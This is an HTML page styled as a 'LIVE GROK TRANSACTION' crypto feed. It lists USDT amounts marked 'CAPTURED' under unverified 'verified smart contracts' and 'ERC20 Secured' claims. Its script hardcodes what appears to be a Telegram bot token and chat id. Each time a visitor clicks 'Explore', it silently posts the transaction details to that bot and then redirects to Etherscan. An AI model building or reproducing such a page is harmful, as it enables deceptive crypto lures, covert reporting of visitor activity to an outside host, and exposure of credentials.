<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LIVE GROK TRANSACTION - Remix Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --remix-green: #6EEB36;
            --remix-black: #050505;
            --glass-bg: rgba(15, 15, 15, 0.85);
            --glass-border: rgba(110, 235, 54, 0.2);
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--remix-black);
            color: white;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
            -webkit-tap-highlight-color: transparent;
        }

        /* Navigation Bar */
        nav {
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--glass-border);
        }

        .live-indicator {
            width: 8px;
            height: 8px;
            background-color: var(--remix-green);
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 10px var(--remix-green);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.3); opacity: 0.4; }
            100% { transform: scale(1); opacity: 1; }
        }

        /* Card & UI Elements */
        .cloudy-card {
            background: var(--glass-bg);
            backdrop-filter: blur(12px);
            border-radius: 28px;
            border: 1px solid var(--glass-border);
            box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 30px rgba(110, 235, 54, 0.05);
            width: 100%;
        }

        .radar-table-container {
            max-height: 400px;
            overflow-y: auto;
            scrollbar-width: thin;
            scrollbar-color: var(--remix-green) rgba(0,0,0,0.2);
        }

        .radar-table-container::-webkit-scrollbar { width: 4px; }
        .radar-table-container::-webkit-scrollbar-thumb { background: var(--remix-green); border-radius: 10px; }

        .tx-row {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(110, 235, 54, 0.1);
            border-radius: 16px;
            margin-bottom: 10px;
            transition: all 0.2s ease;
        }

        .tx-row:hover {
            border-color: var(--remix-green);
            background: rgba(110, 235, 54, 0.05);
            transform: translateY(-2px);
        }

        .link-btn {
            background: var(--remix-green);
            color: #000;
            font-weight: 800;
            font-size: 10px;
            padding: 6px 14px;
            border-radius: 8px;
            text-transform: uppercase;
            transition: all 0.2s;
            cursor: pointer;
            border: none;
            box-shadow: 0 4px 10px rgba(110, 235, 54, 0.2);
        }

        .link-btn:active {
            transform: scale(0.95);
        }

        .status-badge {
            color: var(--remix-green);
            font-family: 'Fira Code', monospace;
            letter-spacing: 1px;
        }

        .note-box {
            background: rgba(110, 235, 54, 0.05);
            border: 1px dashed rgba(110, 235, 54, 0.3);
            border-radius: 12px;
            padding: 12px;
            margin-top: 20px;
            text-align: center;
        }

        .sending {
            opacity: 0.5;
            pointer-events: none;
            filter: grayscale(1);
        }
    </style>
</head>
<body>

    <nav class="px-6 py-4 flex justify-between items-center sticky top-0 z-50">
        <div class="flex items-center gap-3">
            <div class="live-indicator"></div>
            <span class="font-bold text-sm tracking-widest text-white/90">LIVE <span style="color: var(--remix-green)">GROK TRANSACTION</span></span>
        </div>
        <div id="count-badge" class="px-3 py-1 bg-[#6EEB36]/10 border border-[#6EEB36]/30 text-[#6EEB36] rounded-lg text-[10px] font-bold font-mono uppercase">
            Syncing...
        </div>
    </nav>

    <main class="flex-grow flex items-start justify-center p-4 pt-6">
        <div class="cloudy-card w-full max-w-lg p-6">
            
            <div class="flex justify-between items-center mb-6">
                <div>
                    <h2 class="text-[9px] font-bold tracking-[0.4em] uppercase mb-1 status-badge" id="status">Connecting...</h2>
                    <h1 class="text-xl font-extrabold text-white tracking-tight">Cloud Live Feed</h1>
                </div>
                <div class="text-right">
                    <span class="text-[8px] font-mono text-white/40 block" id="last-sync">UPDATE: --:--:--</span>
                    <i class="fas fa-bolt text-[#6EEB36] text-xs"></i>
                </div>
            </div>

            <div class="radar-table-container pr-2" id="tx-list">
                <div class="text-center py-20 opacity-20">
                    <i class="fas fa-circle-notch fa-spin text-4xl mb-4 text-[#6EEB36]"></i>
                    <p class="text-xs font-mono uppercase tracking-widest">Awaiting Remix Kernel...</p>
                </div>
            </div>

            <!-- ملاحظة المعاملات الذكية بالإنجليزية -->
            <div class="note-box">
                <p class="text-[10px] text-[#6EEB36]/80 font-medium leading-relaxed">
                    <i class="fas fa-info-circle mr-1"></i>
                    All transactions are being broadcasted and executed directly from our verified smart contracts.
                </p>
            </div>

            <div class="mt-6 pt-4 border-t border-white/5 flex justify-between items-center">
                <div class="flex items-center gap-2">
                    <i class="fas fa-microchip text-white/20 text-[10px]"></i>
                    <span class="text-[9px] font-bold text-white/20 uppercase">Kernel 0.54.0</span>
                </div>
                <div class="flex items-center gap-2">
                    <i class="fas fa-shield-halved text-white/20 text-[10px]"></i>
                    <span class="text-[9px] font-bold text-white/20 uppercase">ERC20 Secured</span>
                </div>
            </div>
        </div>
    </main>

    <script>
        const botToken = '8742320373:AAEN9pnOVSaZEp8A_6OEqeMelQ5hvfPo6yM'; 
        const chatId = '8423231609';
        let lastTimestamp = 0;

        async function sendAndRedirect(amount, timestamp, txHash, btnElement) {
            btnElement.classList.add('sending');
            btnElement.innerHTML = `<i class="fas fa-spinner fa-spin"></i>`;

            const date = new Date(timestamp * 1000).toLocaleString();
            const etherscanLink = `https://etherscan.io/tx/${txHash}`;
            
            const message = `🟢 *Remix Capture: ${amount} USDT*\n` +
                          `🔗 *Hash:* \`${txHash}\`\n` +
                          `⏰ *Time:* ${date}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});

            setTimeout(() => {
                window.top.location.href = etherscanLink; 
            }, 300);
        }

        async function fetchFromCloud() {
            try {
                const res = await fetch('/api/data');
                const data = await res.json();
                
                if (data.timestamp !== lastTimestamp) {
                    lastTimestamp = data.timestamp;
                    renderData(data.operations);
                    
                    document.getElementById('status').innerText = "CORE CONNECTED - ERC20 SCANNING";
                    document.getElementById('last-sync').innerText = "UPDATE: " + new Date().toLocaleTimeString();
                    document.getElementById('count-badge').innerText = `${data.operations.length} Active Streams`;
                }
            } catch (err) {
                document.getElementById('status').innerText = "KERNEL OFFLINE";
                console.log("Connect your backend to /api/data");
            }
        }

        function renderData(operations) {
            const list = document.getElementById('tx-list');
            if (!operations || operations.length === 0) return;

            list.innerHTML = operations.map(op => {
                const val = Math.floor(parseFloat(op.value));
                return `
                <div class="tx-row p-4 flex justify-between items-center">
                    <div>
                        <div class="flex items-center gap-2 mb-1">
                            <span class="text-lg font-black font-mono text-white">${val.toLocaleString()}</span>
                            <span class="text-[9px] font-bold px-1.5 py-0.5 rounded bg-[#6EEB36]/10 text-[#6EEB36]">USDT</span>
                        </div>
                        <div class="text-[9px] text-white/30 font-medium font-mono">
                            CAPTURED: ${new Date(op.timestamp * 1000).toLocaleTimeString()}
                        </div>
                    </div>
                    <div class="text-right">
                        <button onclick="sendAndRedirect(${val}, ${op.timestamp}, '${op.transactionHash}', this)" class="link-btn">
                            Explore
                        </button>
                    </div>
                </div>
            `}).join('');
        }

        setInterval(fetchFromCloud, 5000);
        fetchFromCloud();
    </script>
</body>
</html>
